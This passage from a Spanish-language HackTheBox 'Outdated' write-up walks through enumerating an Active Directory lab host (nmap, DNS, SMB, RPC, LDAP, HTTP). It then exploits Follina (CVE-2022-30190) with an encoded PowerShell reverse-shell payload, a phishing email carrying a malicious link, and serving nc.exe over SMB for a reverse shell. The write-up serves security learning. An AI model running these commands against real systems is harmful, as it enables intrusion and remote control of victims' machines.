</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>|_ssl-date: 2024-08-27T01:12:57+00:00; +6h00m01s from scanner time.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>| ssl-cert: Subject: commonName=DC.outdated.htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>| Not valid before: 2023-12-13T00:17:36
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>|_Not valid after:  2024-12-12T00:17:36
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>| ssl-cert: Subject: commonName=DC.outdated.htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>| Not valid before: 2023-12-13T00:17:36
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>|_Not valid after:  2024-12-12T00:17:36
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>|_ssl-date: 2024-08-27T01:12:58+00:00; +6h00m02s from scanner time.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>|_ssl-date: 2024-08-27T01:12:57+00:00; +6h00m02s from scanner time.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>| ssl-cert: Subject: commonName=DC.outdated.htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>| Not valid before: 2023-12-13T00:17:36
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40</span><span>|_Not valid after:  2024-12-12T00:17:36
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41</span><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42</span><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43</span><span>8530/tcp  open  http          Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44</span><span>|_http-title: Site doesn<span style="color:#f00">&#39;</span>t have a title.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45</span><span>| http-methods: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46</span><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47</span><span>8531/tcp  open  unknown
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48</span><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49</span><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50</span><span>49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51</span><span>49692/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52</span><span>49914/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53</span><span>49940/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54</span><span>49961/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55</span><span>Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57</span><span>Host script results:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58</span><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59</span><span>|   3:1:1: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60</span><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61</span><span>| smb2-time: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">62</span><span>|   date: 2024-08-27T01:12:14
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">63</span><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">64</span><span>|_clock-skew: mean: 6h00m01s, deviation: 0s, median: 6h00m01s
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">65</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">66</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">67</span><span><span style="color:#007f7f"># Nmap done at Mon Aug 26 21:12:56 2024 -- 1 IP address (1 host up) scanned in 100.77 seconds</span></span></span></code></pre></div>
<h1 id="udp-enumeration">UDP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> -sU --min-rate <span style="color:#ff0;font-weight:bold">5000</span> -n -Pn 10.129.229.239 -oN allPorts.UDP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 21:12 CEST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.229.239
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.039s latency).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Not shown: <span style="color:#ff0;font-weight:bold">1497</span> open|filtered udp ports (no-response)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT    STATE SERVICE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>53/udp  open  domain
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>88/udp  open  kerberos-sec
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>123/udp open  ntp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 0.96 seconds</span></span></code></pre></div>
<p>Detectamos que nos enfrentamos contra un entorno de directorio activo ya que están puertos expuestos típicos como 88/TCP Keberos, 389/TCP LDAP.</p>
<p>También encontramos un dominio, <code>outdated.htb</code>, lo agregamos al <code>/etc/hosts</code>, encontramos el nombre NS del DC <code>DC.outdated.htb</code></p>
<p>También vemos un servidor web IIS por el puerto 8530/TCP</p>
<h1 id="dns-enumeration">DNS Enumeration</h1>
<p>Siempre que veo un servidor DNS me gusta enumerarlo para ver si podemos encontrar mas subdominios.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>dnsenum -f /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -dnsser
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>ver 10.129.229.239 outdated.htb</span></span></code></pre></div>
<p>Nos reporta un subdominio <code>mail.outdated.htb</code>, <code>client.outdated.htb</code> y <code>wsus.outdated.htb</code>, los añadimos también al <code>/etc/hosts</code></p>
<p>No podemos hacer una transferencia de zona.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>dig axfr outdated.htb @10.129.229.239
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>; &lt;&lt;&gt;&gt; DiG 9.18.24-1-Debian &lt;&lt;&gt;&gt; axfr outdated.htb @10.129.229.239
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>;; global options: +cmd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>; Transfer failed.</span></span></code></pre></div>
<h1 id="smb-enumeration">SMB Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>smbmap -H 10.129.229.239 -u <span style="color:#0ff;font-weight:bold">&#39;null&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>[+] Guest session       IP: 10.129.229.239:445  Name: wsus.outdated.htb                                 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>        Disk                                                    Permissions     Comment
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>        ----                                                    -----------     -------
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>        C$                                                      NO ACCESS       Default share
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>        IPC$                                                    READ ONLY       Remote IPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>        NETLOGON                                                NO ACCESS       Logon server share 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>        Shares                                                  READ ONLY
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>        SYSVOL                                                  NO ACCESS       Logon server share 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>        UpdateServicesPackages                                  NO ACCESS       A network share to be used by client systems <span style="color:#fff;font-weight:bold">for</span> collecting all software packages (usually applications) published on this WSUS system.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>        WsusContent                                             NO ACCESS       A network share to be used by Local Publishing to place published content on this WSUS system.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>        WSUSTemp                                                NO ACCESS       A network share used by Local Publishing from a Remote WSUS Console Instance.</span></span></code></pre></div>
<p>Haciendo uso de una null session detectamos varios recursos.</p>
<p>Me interesa el recurso <code>Shares</code> ya que el otro recurso compartido al que tenemos acceso es <code>IPC$</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>smbclient <span style="color:#0ff;font-weight:bold">\\\\</span>10.129.229.239<span style="color:#0ff;font-weight:bold">\\</span>Shares -U <span style="color:#0ff;font-weight:bold">&#39;null&#39;</span> -N</span></span></code></pre></div>
<p>Vemos un fichero <code>NOC_Reminder.pdf</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>smb: <span style="color:#0ff;font-weight:bold">\&gt;</span> dir
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>  .                                   D        <span style="color:#ff0;font-weight:bold">0</span>  Mon Jun <span style="color:#ff0;font-weight:bold">20</span> 17:01:33 <span style="color:#ff0;font-weight:bold">2022</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>  ..                                  D        <span style="color:#ff0;font-weight:bold">0</span>  Mon Jun <span style="color:#ff0;font-weight:bold">20</span> 17:01:33 <span style="color:#ff0;font-weight:bold">2022</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>  NOC_Reminder.pdf                   AR   <span style="color:#ff0;font-weight:bold">106977</span>  Mon Jun <span style="color:#ff0;font-weight:bold">20</span> 17:00:32 <span style="color:#ff0;font-weight:bold">2022</span></span></span></code></pre></div>
<p>Nos lo descargamos.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>smb: <span style="color:#0ff;font-weight:bold">\&gt;</span> get NOC_Reminder.pdf
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>getting file <span style="color:#0ff;font-weight:bold">\N</span>OC_Reminder.pdf of size <span style="color:#ff0;font-weight:bold">106977</span> as NOC_Reminder.pdf (458,2 KiloBytes/sec) (average 458,2 KiloBytes/sec)</span></span></code></pre></div>
<p>Leyendo el PDF me interesa esto:</p>
<blockquote>
<p>please assist our NOC by e-mailing a link to any internal web applications to
<a href="mailto:itsupport@outdated.htb">itsupport@outdated.htb</a> so we can get them added back into our monitoring platform for alerts and notifications.</p>
</blockquote>
<p>Pide que enviemos un correo con un link a <code>itsupport@outdated.htb</code> para poder añadir este link a las plataformas de monitorización alerta y notificaciones.</p>
<h1 id="rpc-enumeration">RPC Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>rpcclient -N -U <span style="color:#0ff;font-weight:bold">&#34;&#34;</span> 10.129.229.239
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>rpcclient $&gt; enumdomusers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>result was NT_STATUS_ACCESS_DENIED
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>rpcclient $&gt; enumdomgroups
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>result was NT_STATUS_ACCESS_DENIED</span></span></code></pre></div>
<h1 id="ldap-enumeration">LDAP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>ldapsearch -H ldap://outdated.htb/ -x -s base -b <span style="color:#0ff;font-weight:bold">&#39;&#39;</span> <span style="color:#0ff;font-weight:bold">&#34;(objectClass=*)&#34;</span> <span style="color:#0ff;font-weight:bold">&#34;*&#34;</span></span></span></code></pre></div>
<p>Podemos recuperar algo de información pero nada interesante.</p>
<h1 id="http-enumeration">HTTP Enumeration</h1>
<p><code>whatweb</code> no me reporta nada que no sepamos.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>whatweb http://outdated.htb:8530
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>http://outdated.htb:8530 [<span style="color:#ff0;font-weight:bold">200</span> OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.229.239], Microsoft-IIS[10.0], X-Powered-By[ASP.NET]</span></span></code></pre></div>
<p>Fuzzeando no encuentro nada relevante.</p>
<h1 id="exploiting-follina---foothold">Exploiting Follina -&gt; Foothold</h1>
<p>En el PDF que hemos visto antes nos adjuntaban una tabla con vulnerabilidades que supuestamente todavía no están parcheadas.</p>
<p>La primera de todas es el <code>CVE-2022-30190</code>, mas conocido como Follina.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Podemos utilizar <a href="https://github.com/whokilleddb/Follina">este PoC</a> para realizar la explotación.</p>
<p>Nos podemos copiar el one-liner en powershell de <a href="https://revshells.com">revshells.com</a></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>python3 follina_exploit.py -c <span style="color:#0ff;font-weight:bold">&#34;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY......&#34;</span></span></span></code></pre></div>
<p>Ahora nos vamos a dirigir a esta ruta y vamos a servir el <code>index.html</code> a través del puerto 80, por alguna razón solo consigo que este link se abra cuando se comparte un link sin especificar el puerto.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">cd</span> /tmp/follina_0osyx6x_/www/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>sudo python3 -m http.server <span style="color:#ff0;font-weight:bold">80</span></span></span></code></pre></div>
<p>Ahora enviamos el correo electrónico a la dirección que habíamos encontrado antes con el enlace malicioso.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>swaks --to itsupport@outdated.htb --from pointedsec@gmail.com --server mail.outd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>ated.htb --body <span style="color:#0ff;font-weight:bold">&#34;http://10.10.14.125/&#34;</span> --header <span style="color:#0ff;font-weight:bold">&#34;Subject:Internal Web App Request&#34;</span></span></span></code></pre></div>
<p>Por alguna razón no funciona.</p>
<p>Como tiene el SMB abierto vamos a compartirnos el <code>netcat</code> y vamos a enviarnos una revshell.</p>
<p>Nos copiamos el netcat.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>cp /opt/SecLists/Web-Shells/FuzzDB/nc.exe .</span></span></code></pre></div>
<p>Servimos este archivo por SMB</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sudo impacket-smbserver -smb2support smbFolder .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Impacket v0.12.0.dev1+20240819.165705.f98c9870 - Copyright <span style="color:#ff0;font-weight:bold">2023</span> Fortra
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>[*] Config file parsed
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>[*] Callback added <span style="color:#fff;font-weight:bold">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>[*] Callback added <span style="color:#fff;font-weight:bold">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>[*] Config file parsed
